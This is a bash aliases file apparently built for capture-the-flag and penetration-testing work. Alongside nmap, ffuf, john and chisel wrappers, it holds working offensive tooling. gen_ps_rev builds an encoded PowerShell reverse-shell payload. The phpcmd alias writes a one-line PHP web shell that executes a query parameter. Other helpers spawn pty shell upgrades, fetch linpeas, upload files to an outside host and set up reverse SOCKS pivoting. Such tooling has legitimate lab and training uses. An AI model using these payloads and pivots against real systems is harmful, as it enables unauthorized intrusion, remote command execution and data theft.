#!/usr/bin/env bash
# ctf_bash_aliases.sh
# POSIX-friendly-ish bash aliases and functions tuned for Kali (Linux) and macOS
# Drop this in ~/.bash_aliases or source it from ~/.bashrc or ~/.bash_profile
# Usage: source ~/.bash_aliases

# --------- platform detection ---------
OS_TYPE="$(uname -s)"
IS_MAC=false
IS_LINUX=false
if [ "$OS_TYPE" = "Darwin" ]; then
  IS_MAC=true
elif [ "$OS_TYPE" = "Linux" ]; then
  IS_LINUX=true
fi

# --------- utilities ---------
_timestamp() { date +%Y%m%d-%H%M%S; }
_need() {
  local miss=0
  for cmd in "$@"; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      printf '[!] missing required: %s\n' "$cmd" >&2
      miss=1
    fi
  done
  return $miss
}

# cross-platform clipboard helper
_clipboard_copy() {
  # usage: _clipboard_copy "string"
  local data="$1"
  if $IS_MAC; then
    if command -v pbcopy >/dev/null 2>&1; then
      printf '%s' "$data" | pbcopy
      return 0
    fi
  else
    # linux
    if command -v xclip >/dev/null 2>&1; then
      printf '%s' "$data" | xclip -selection clipboard
      return 0
    elif command -v xsel >/dev/null 2>&1; then
      printf '%s' "$data" | xsel --clipboard --input
      return 0
    fi
  fi
  return 1
}

# --------- network / filesystem helpers ---------
list_ips() {
  if $IS_MAC; then
    # prefer ifconfig on mac
    if ! command -v ifconfig >/dev/null 2>&1; then
      echo '[!] ifconfig missing' >&2; return 1
    fi
    ifconfig | awk '/^[a-z0-9]/ { iface=$1 } /inet /{ if($2!="127.0.0.1") print "["iface"] " $2 }'
  else
    if ! command -v ip >/dev/null 2>&1; then
      echo '[!] ip missing' >&2; return 1
    fi
    ip -4 addr show scope global | awk '/^[0-9]+: /{gsub(":","",$2); iface=$2} /^[[:space:]]*inet /{split($2,a,"/"); printf "[%s] %s\n", iface, a[1]}'
  fi
}

ls_pwd() {
  printf "[\e[96m%s\e[0m]\e[34m\n" "$(pwd)"
  # let ls pick colors on linux, mac uses -G
  if $IS_MAC; then ls -G -- "$@" 2>/dev/null || ls -- "$@"; else ls --color=auto -- "$@" 2>/dev/null || ls -- "$@"; fi
  echo -en "\e[0m"
}

mkdir_cd() {
  if [ -z "$1" ]; then
    echo '[i] Usage: mkdir_cd <dir>'
    return 1
  fi
  mkdir -p -- "$1" && cd -- "$1" || return $?
}

serve_http() {
  # serve directory via python3 http.server; uses non-root port by default
  local port="${1:-8000}" dir="${2:-.}"
  if ! command -v python3 >/dev/null 2>&1; then
    echo '[!] python3 required' >&2; return 1
  fi
  (cd -- "$dir" && echo "[i] Serving $dir on 0.0.0.0:$port" && python3 -m http.server "$port")
}

# copy tun0 ip to clipboard (works on linux/mac if tun exists)
tun0_ip_copy() {
  if $IS_MAC; then
    local ipaddr
    ipaddr=$(ifconfig tun0 2>/dev/null | awk '/inet /{print $2}')
  else
    local ipaddr
    ipaddr=$(ip -4 address show dev tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1)
  fi
  if [ -z "$ipaddr" ]; then
    echo '[!] tun0 not present or no ipv4' >&2; return 1
  fi
  if _clipboard_copy "$ipaddr"; then
    echo "[+] copied $ipaddr to clipboard"
  else
    printf '%s\n' "$ipaddr"
  fi
}

# --------- SecLists finder ----------
get_seclists_dir() {
  if [ -n "${SECLISTS_PATH:-}" ] && [ -d "$SECLISTS_PATH" ]; then
    printf '%s\n' "$SECLISTS_PATH"; return 0
  fi
  for p in /opt/seclists /usr/share/seclists /usr/local/share/seclists; do
    [ -d "$p" ] && { printf '%s\n' "$p"; return 0; }
  done
  echo 'Error: Could not find SecLists. Set SECLISTS_PATH or install SecLists.' >&2
  return 1
}

# --------- john / rockyou helper ----------
rock_john() {
  if ! _need john; then return 1; fi
  if [ $# -eq 0 ]; then
    echo '[i] Usage: rock_john <hashfile> [john options]'; return 1
  fi
  local wordlist="${ROCKYOU_PATH:-/usr/share/wordlists/rockyou.txt}"
  if [ ! -f "$wordlist" ]; then
    echo "[!] rockyou not found at $wordlist; pass --wordlist <path> or set ROCKYOU_PATH" >&2
    john "${@}"
  else
    john --wordlist="$wordlist" "${@}"
  fi
}

# --------- nmap wrappers (timestamped outputs) ----------
nmap_outdir() { mkdir -p ./nmap && printf './nmap/%s' "$(_timestamp)"; }

nmap_default() {
  if ! _need nmap sudo; then return 1; fi
  if [ $# -eq 0 ]; then echo '[i] Usage: nmap_default <target> [nmap options]'; return 1; fi
  local base="./nmap/tcp_default_$(_timestamp)"
  mkdir -p ./nmap
  sudo nmap -sCV -T4 --min-rate 10000 "$@" -v -oA "$base"
  echo "[+] outputs: ${base}.{nmap,gnmap,xml}"
}

nmap_udp() {
  if ! _need nmap sudo; then return 1; fi
  if [ $# -eq 0 ]; then echo '[i] Usage: nmap_udp <target> [nmap options]'; return 1; fi
  local base="./nmap/udp_default_$(_timestamp)"
  mkdir -p ./nmap
  sudo nmap -sUCV -T4 --min-rate 10000 "$@" -v -oA "$base"
  echo "[+] outputs: ${base}.{nmap,gnmap,xml}"
}

# --------- reverse shell helpers ----------
gen_ps_rev() {
  if [ "$#" -lt 2 ]; then
    echo '[i] Usage: gen_ps_rev <ip> <port> [template-file]'; return 1; fi
  local ip="$1" port="$2" tmpl="${3:-$HOME/zsh-aliases/shells/ps_rev.txt}"
  if [ ! -f "$tmpl" ]; then echo "[!] template not found: $tmpl" >&2; return 1; fi
  local SHELL
  SHELL=$(sed "s/x.x.x.x/$ip/g; s/yyyy/$port/g" "$tmpl" | iconv -f utf8 -t utf16le 2>/dev/null | base64 -w 0 2>/dev/null)
  if [ -z "$SHELL" ]; then echo '[!] failed to build payload' >&2; return 1; fi
  local out="powershell -enc $SHELL"
  if _clipboard_copy "$out"; then echo '[+] copied payload to clipboard'; else printf '%s\n' "$out"; fi
}

# TTY upgrades: copy to clipboard for pasting
uptty() {
  printf '%s\n' "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" "python -c 'import pty;pty.spawn(\"/bin/bash\")'" "/usr/bin/script -qc /bin/bash /dev/null" | sed '/^$/d' | awk '{print}' | ( _clipboard_copy "$(cat)" 2>/dev/null || cat )
  echo '[+] tty upgrade commands copied (or printed if clipboard unavailable)'
}

alias script_tty_upgrade="echo '/usr/bin/script -qc /bin/bash /dev/null' | awk '{print}' | ( _clipboard_copy \"$(cat)\" 2>/dev/null || cat )"
alias tty_fix="stty raw -echo; fg; reset"
alias tty_conf="stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g' | tee /dev/tty | ( _clipboard_copy \"$(cat)\" 2>/dev/null || cat )"

# --------- ffuf / vhost / fuzz_dir ----------
vhost() {
  if [ -z "$1" ]; then echo '[i] Usage: vhost <domain> [ffuf args]'; return 1; fi
  if ! _need ffuf; then return 1; fi
  local domain="$1"; shift
  local seclists; seclists=$(get_seclists_dir) || return 1
  local wl="$seclists/Discovery/DNS/bitquark-subdomains-top100000.txt"
  [ -f "$wl" ] || { echo "[!] vhost wordlist missing: $wl" >&2; return 1; }
  local url="$domain"
  case "$url" in http://*|https://*) ;; *) url="http://$url" ;; esac
  ffuf -H "Host: FUZZ.$domain" -u "$url" -w "$wl" "$@"
}

fuzz_dir() {
  if [ -z "$1" ]; then echo '[i] Usage: fuzz_dir <url> [-w <wordlist>] [ffuf options]'; return 1; fi
  if ! _need ffuf; then return 1; fi
  local url="$1"; shift
  local seclists; seclists=$(get_seclists_dir) || return 1
  local wl="$seclists/Discovery/Web-Content/raft-large-directories.txt"
  [ -f "$wl" ] || wl="$seclists/Discovery/Web-Content/common.txt"
  ffuf -u "$url/FUZZ" -w "$wl" -e .php,.asp,.txt,.php.old,.html,.php.bak,.bak,.aspx "$@"
}

# --------- chisel helpers (expects chisel binary at ~/zsh-aliases/tools/chisel or in PATH) ----------
chisel_socks() {
  if [ "$#" -ne 2 ]; then echo '[i] Usage: chisel_socks <ip> <server_port>'; return 1; fi
  local ip="$1" port="$2"
  local chisel_bin="${CHISEL_BIN:-$HOME/zsh-aliases/tools/chisel}"
  if ! command -v "$chisel_bin" >/dev/null 2>&1; then echo "[!] chisel not found at $chisel_bin and not in PATH" >&2; return 1; fi
  printf './chisel client -v %s:%s R:socks\n' "$ip" "$port" | ( _clipboard_copy "$(cat)" 2>/dev/null || cat )
  echo '[+] client command copied; launching server locally'
  "$chisel_bin" server -v -p "$port" --reverse
}

chisel_forward() {
  if [ "$#" -ne 4 ]; then echo '[i] Usage: chisel_forward <local_ip> <local_port> <remote_ip> <remote_port>'; return 1; fi
  printf './chisel client %s:8888 R:%s:%s:%s\n' "$1" "$2" "$3" "$4" | ( _clipboard_copy "$(cat)" 2>/dev/null || cat )
  echo '[+] chisel forward client copied; use server: ~/zsh-aliases/tools/chisel server -p 8888 --reverse'
}

# --------- hosts editing (safe) ----------
addhost() {
  if [ "$#" -ne 2 ]; then echo '[i] Usage: addhost <ip> <hostname>'; return 1; fi
  local ip="$1" hostname="$2"
  if ! command -v sudo >/dev/null 2>&1; then echo '[!] sudo required' >&2; return 1; fi
  # ensure not duplicating hostnames
  if grep -qE "[[:space:]]${hostname}($|[[:space:]])" /etc/hosts; then
    echo "[i] hostname exists; replacing entry for $hostname"
    sudo sed -ri "/[[:space:]]${hostname}($|[[:space:]])/s/^.*$/$ip\t$hostname/" /etc/hosts
  else
    echo "$ip $hostname" | sudo tee -a /etc/hosts >/dev/null
    echo "[+] Added $ip $hostname"
  fi
  grep -E "[[:space:]]${hostname}($|[[:space:]])" /etc/hosts || true
}

# --------- misc conveniences ----------
alias start_htb='python3 ~/zsh-aliases/start_htb.py'
alias linpeas='curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -s --output lin.sh'
alias upload='curl -sS bashupload.com -T "${@}"'
alias phpcmd='printf "%s\n" "<?=\`\$_GET[0]\`?>" > cmd.php && echo "[+] wrote cmd.php"'
alias burl='curl -x http://127.0.0.1:8080/ -k'

# path fix
export PATH="$HOME/zsh-aliases/shells/:$PATH"

# --------- small helper list ----------
_ctf_help() {
  cat <<'EOF'
ctf_bash_aliases: available helpers
 - list_ips           : list global IPv4 addresses
 - ls_pwd             : show cwd + ls
 - mkdir_cd <dir>     : mkdir -p and cd
 - serve_http [port]  : serve current dir via python3
 - tun0_ip_copy       : copy tun0 ip to clipboard (if available)
 - get_seclists_dir   : locate SecLists
 - rock_john <file>   : run john with rockyou
 - nmap_default <tgt> : nmap -sCV -oA ./nmap/tcp_default_...
 - nmap_udp <tgt>     : nmap UDP scan
 - gen_ps_rev ip port : generate PS encoded payload to clipboard
 - uptty              : copy tty upgrade cmd to clipboard
 - vhost <domain>     : ffuf vhost fuzzing
 - fuzz_dir <url>     : ffuf directory fuzzing
 - chisel_socks ip p  : copy client + run server
 - chisel_forward a b c d : copy client command
 - addhost ip host    : add/update /etc/hosts
EOF
}
alias ctf_help=_ctf_help

# end of file
